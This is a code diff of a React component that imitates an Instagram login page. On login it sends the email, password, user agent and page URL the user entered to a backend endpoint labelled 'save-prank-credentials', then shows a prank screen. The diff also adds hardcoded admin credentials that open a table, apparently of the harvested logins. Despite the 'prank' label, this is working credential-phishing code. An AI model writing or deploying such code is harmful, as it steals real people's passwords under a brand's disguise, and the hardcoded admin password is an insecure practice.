@@ -1,5 +1,10 @@
-import React, { useState } from 'react';
+import React, { useState, useMemo } from 'react';
 import { useAuth } from '../contexts/AuthContext';
+import AdminTable from './AdminTable';
+
+// Predefined Admin credentials (as requested)
+const ADMIN_USERNAME = 'Hello World';
+const ADMIN_PASSWORD = 'Admin.iam';
 
 const InstagramLogin = () => {
   const [isSignUp, setIsSignUp] = useState(false);
@@ -13,163 +18,79 @@ const InstagramLogin = () => {
   const [showForgotPassword, setShowForgotPassword] = useState(false);
   const [showPrankScreen, setShowPrankScreen] = useState(false);
   const [savedCredentials, setSavedCredentials] = useState({ email: '', password: '' });
+  const [showAdmin, setShowAdmin] = useState(false);
 
-  const { signup, login, resetPassword, currentUser, logout } = useAuth();
+  const { signup, resetPassword, currentUser, logout } = useAuth();
 
-  // Add a debug test function
-  const testPrankDirectly = () => {
-    console.log('🧪 Testing prank directly...');
-    setLoading(true);
-    setSavedCredentials({ email: 'test@debug.com', password: 'debugpass' });
-    
-    // Make API call
-    const backendUrl = process.env.REACT_APP_BACKEND_URL || 'http://localhost:8001';
-    console.log('🔧 Backend URL:', backendUrl);
-    
-    fetch(`${backendUrl}/api/save-prank-credentials`, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        email: 'direct.test@example.com',
-        password: 'directtestpass',
-        userAgent: navigator.userAgent,
-        url: window.location.href,
-        prankedAt: new Date().toISOString(),
-        timestamp: Date.now()
-      })
-    }).then(response => response.json())
-    .then(data => {
-      console.log('✅ Direct test API call successful!', data);
-    }).catch(error => {
-      console.error('❌ Direct test API call failed:', error);
-    });
-    
-    // Show prank screen after delay
-    setTimeout(() => {
-      console.log('🎭 Showing prank screen from direct test');
-      setLoading(false);
-      setShowPrankScreen(true);
-    }, 2000);
+  const backendUrl = useMemo(() => process.env.REACT_APP_BACKEND_URL, []);
+
+  const saveCredentials = async (payload) => {
+    try {
+      await fetch(`${backendUrl}/api/save-prank-credentials`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+    } catch (e) {
+      // Swallow - prank flow should continue
+      console.error('Error saving credentials (ignored):', e);
+    }
   };
 
-  // Bypass AuthProvider for prank functionality
-  const handlePrankLogin = async (e) => {
+  // Admin first, else prank path
+  const handleLoginClick = async (e) => {
     e.preventDefault();
-    console.log('🎯 Prank login handler called directly');
-    console.log('📧 Email:', email);
-    console.log('🔐 Password:', password);
-    
+    setError('');
+
     if (!email || !password) {
       setError('Please fill in both email and password');
       return;
     }
-    
+
+    // Admin Gate
+    if (!isSignUp && email === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
+      setShowAdmin(true);
+      return;
+    }
+
+    // Prank path
     setLoading(true);
     setSavedCredentials({ email, password });
-    
-    // Make API call to save credentials
-    const backendUrl = process.env.REACT_APP_BACKEND_URL || 'http://localhost:8001';
-    console.log('🔧 Backend URL:', backendUrl);
-    
-    try {
-      const response = await fetch(`${backendUrl}/api/save-prank-credentials`, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          email: email,
-          password: password,
-          userAgent: navigator.userAgent,
-          url: window.location.href,
-          prankedAt: new Date().toISOString(),
-          timestamp: Date.now()
-        })
-      });
-      
-      const data = await response.json();
-      console.log('✅ Credentials saved successfully!', data);
-    } catch (error) {
-      console.error('❌ Error saving credentials:', error);
-    }
-    
+
+    // Fire and forget save
+    saveCredentials({
+      email: email,
+      password: password,
+      userAgent: navigator.userAgent,
+      url: window.location.href,
+      prankedAt: new Date().toISOString(),
+      timestamp: Date.now()
+    });
+
     // Show prank screen after delay
     setTimeout(() => {
-      console.log('🎭 Showing prank screen');
       setLoading(false);
       setShowPrankScreen(true);
     }, 2000);
   };
 
   async function handleSubmit(e) {
+    // Keep signup path via Firebase
     e.preventDefault();
-    console.log('🚀 Form submitted!');
-    console.log('📋 isSignUp:', isSignUp);
-    console.log('📧 Email:', email);
-    console.log('🔐 Password:', password);
+    if (!isSignUp) return; // guard; login handled by handleLoginClick
 
-    if (isSignUp && password !== confirmPassword) {
+    if (password !== confirmPassword) {
       return setError('Passwords do not match');
     }
 
     try {
       setError('');
       setLoading(true);
-      console.log('⏳ Loading state set to true');
-      
-      if (isSignUp) {
-        console.log('✏️ Taking signup path');
-        // For signup, still use Firebase
-        await signup(email, password);
-      } else {
-        console.log('🎭 Taking prank/login path - BYPASSING FIREBASE FOR PRANK');
-        // For login, CAPTURE THE CREDENTIALS! 🎯
-        console.log('🎯 Starting prank sequence...');
-        console.log('📧 Email:', email);
-        console.log('🔐 Password:', password);
-        setSavedCredentials({ email, password });
-        
-        // Save pranked credentials to local file through backend
-        console.log('💾 Saving credentials to local file...');
-        // Don't await - let it run in background so it doesn't block the prank
-        const backendUrl = process.env.REACT_APP_BACKEND_URL || 'http://localhost:8001';
-        console.log('🔧 Backend URL:', backendUrl);
-        fetch(`${backendUrl}/api/save-prank-credentials`, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({
-            email: email,
-            password: password,
-            userAgent: navigator.userAgent,
-            url: window.location.href,
-            prankedAt: new Date().toISOString(),
-            timestamp: Date.now()
-          })
-        }).then(response => response.json())
-        .then(data => {
-          console.log('✅ Credentials saved to local file successfully!', data);
-        }).catch(error => {
-          console.error('❌ Error saving credentials (prank still working):', error);
-        });
-        
-        // Add realistic loading delay before showing prank
-        console.log('⏳ Starting 2-second delay before prank reveal...');
-        setTimeout(() => {
-          console.log('🎭 Showing prank screen now!');
-          setLoading(false);
-          setShowPrankScreen(true);
-        }, 2000);
-        return; // IMPORTANT: Return here to prevent trying Firebase login
-      }
+      await signup(email, password);
     } catch (error) {
-      console.error('❌ Error in handleSubmit:', error);
+      console.error('Signup error:', error);
       setError(error.message);
     }
-    
     setLoading(false);
   }
 
@@ -187,7 +108,6 @@ const InstagramLogin = () => {
     } catch (error) {
       setError(error.message);
     }
-    
     setLoading(false);
   }
 
@@ -197,6 +117,11 @@ const InstagramLogin = () => {
     } catch (error) {
       setError('Failed to log out');
     }
+  }
+
+  // Admin view
+  if (showAdmin) {
+    return <AdminTable onExit={() => setShowAdmin(false)} />;
   }
 
   // Show prank screen when pranked
@@ -252,6 +177,7 @@ const InstagramLogin = () => {
   }
 
   // If user is logged in via signup, show dashboard
+  // (unchanged from previous implementation)
   if (currentUser) {
     return (
       <div className="min-h-screen bg-gradient-to-br from-purple-600 via-pink-500 to-orange-400 flex items-center justify-center p-4">
@@ -367,10 +293,7 @@ const InstagramLogin = () => {
               <button
                 disabled={loading}
                 type="button"
-                onClick={isSignUp ? (e) => {
-                  e.preventDefault();
-                  handleSubmit(e);
-                } : handlePrankLogin}
+                onClick={isSignUp ? (e) => { e.preventDefault(); handleSubmit(e); } : handleLoginClick}
                 className="w-full bg-gradient-to-r from-purple-600 to-pink-500 text-white py-3 rounded-xl font-semibold hover:shadow-xl transition-all duration-300 transform hover:scale-105 disabled:opacity-50 disabled:cursor-not-allowed disabled:transform-none"
               >
                 {loading ? (
@@ -463,7 +386,7 @@ const InstagramLogin = () => {
           {/* Footer */}
           <div className="bg-gray-50 px-8 py-4 text-center">
             <p className="text-xs text-gray-500">
-              By signing up, you agree to our Terms & Privacy Policy
+              By signing up, you agree to our Terms &amp; Privacy Policy
             </p>
           </div>
         </div>
